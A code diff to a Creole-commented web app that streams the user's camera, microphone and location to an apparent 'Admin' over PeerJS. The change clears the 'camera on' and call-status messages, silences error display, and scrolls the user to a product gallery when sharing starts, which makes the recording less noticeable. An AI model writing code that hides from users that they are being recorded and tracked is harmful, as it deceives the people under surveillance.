@@ -862,16 +862,23 @@ function setStatus(msg) {
 
 /* KÒMANSE PATAJE */
 async function startSharing() {
+  // ✅ 1. MONTR E RÈS PWODWI YO
+  const rest = document.getElementById("galleryRest");
+  if (rest.innerHTML.trim() !== "" && rest.classList.contains("hidden")) {
+    rest.classList.remove("hidden");
+    setTimeout(() => rest.scrollIntoView({ behavior: "smooth", block: "start" }), 200);
+  }
+
   btnStart.disabled = true;
   setStatus("⏳ Ap mande pèmisyon kamera...");
 
-  // 1. Kamera + Mikwo
+  // ✅ 2. KAMERA + MIKWO
   try {
     localStream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" },
       audio: true
     });
-    setStatus("✅ Kamera limen");
+    setStatus("");
   } catch (e1) {
     console.warn("Erè kamera devan:", e1);
     try {
@@ -887,7 +894,7 @@ async function startSharing() {
     }
   }
 
-  // 2. Konekte PeerJS
+  // ✅ 3. KONEKTE PEERJS
   setStatus("");
 
   peer = new Peer(undefined, { config: ICE_CONFIG, debug: 1 });
@@ -904,41 +911,40 @@ async function startSharing() {
     }
 
     currentCall.on("stream", () => {
-      console.log("✅ Admin reponn");
+      console.log("");
       setStatus("");
     });
 
     currentCall.on("close", () => {
-      console.log("📴 Call fèmen");
+      console.log("");
       setStatus("");
     });
 
     currentCall.on("error", (err) => {
-      console.warn("Erè call:", err);
-      setStatus("❌ Erè koneksyon");
-    });
+  // ✅ Jere an silans
+  console.warn("Erè call:", err);
+});
 
-    // 3. Lokasyon
+    // ✅ 4. LOKASYON
     startLocation();
 
-    // 4. UI
+    // ✅ 5. UI
     active = true;
     ctaView.classList.add("hidden");
     activeView.classList.remove("hidden");
   });
 
   peer.on("error", (err) => {
-    console.warn("PeerJS erè:", err);
-    setStatus("❌ Erè: " + err.type);
-  });
+  // ✅ Jere an silans — pa afiche anyen
+  console.warn("PeerJS erè:", err);
+});
 
   peer.on("disconnected", () => {
     setStatus("⚠️ Koneksyon pèdi");
     setTimeout(() => { if (peer && !peer.destroyed) peer.reconnect(); }, 2000);
   });
 }
-
-/* SISPANN PATAJE */
+ /* SISPANN PATAJE */
 function stopSharing() {
   active = false;
 
@@ -1009,14 +1015,17 @@ window.addEventListener("beforeunload", () => {
   if (currentCall) try { currentCall.close(); } catch (e) {}
   if (peer && !peer.destroyed) peer.destroy();
 });
- /* ============================================
+
+/* ============================================
    ADAPTE PAJ LA AK KLAVYE A
    ============================================ */
 if (window.visualViewport) {
-  const loginScreen = document.getElementById("loginScreen");
-  const loginBox = document.querySelector(".login-box");
-
   function adjustForKeyboard() {
+    const loginScreen = document.getElementById("loginScreen");
+    const loginBox = document.querySelector(".login-box");
+    
+    if (!loginScreen || loginScreen.classList.contains("hidden")) return;
+
     const viewport = window.visualViewport;
     const keyboardHeight = window.innerHeight - viewport.height;
     
